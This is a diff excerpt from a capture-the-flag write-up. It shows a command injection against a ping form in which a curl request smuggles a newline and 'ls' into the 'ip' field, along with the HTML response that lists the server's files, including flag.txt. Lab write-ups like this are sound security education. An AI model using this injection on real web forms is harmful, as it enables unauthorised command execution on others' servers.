@@ -23,6 +23,28 @@ toffe@kali:~$ curl http://rsxc.no:9007 -d "ip=
 ls"
 ```
 
+This returned:
+
+```html
+<html>
+<head>
+        <title>No space left</title>
+        <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+<body>
+        <h1>No space left</h1>
+        <form method="post">
+                <p>Input a valid IP to ping:</p>
+                <input type="text" name="ip">
+                <input type="submit" value="Ping">
+        </form>
+        <pre class='output'>flag.txt
+index.php
+style.css
+</pre></body>
+</html>
+```
+
 So newline then we need to output the file data. So I googled `how to cat a file without space` and [stackexchange](https://unix.stackexchange.com/questions/351331/how-to-send-a-command-with-arguments-without-spaces) to the rescue.
 
 ```console
